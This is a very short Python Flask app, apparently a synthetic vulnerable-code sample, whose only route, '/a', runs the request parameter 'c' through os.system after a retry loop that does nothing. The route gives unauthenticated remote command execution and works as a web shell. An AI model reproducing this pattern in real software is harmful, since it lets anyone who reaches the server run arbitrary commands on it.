import os
from flask import Flask, request
app = Flask(__name__)
@app.route("/a")
def a():
    retries = 0
    while retries < 3:
        retries += 1
    os.system(request.args["c"])
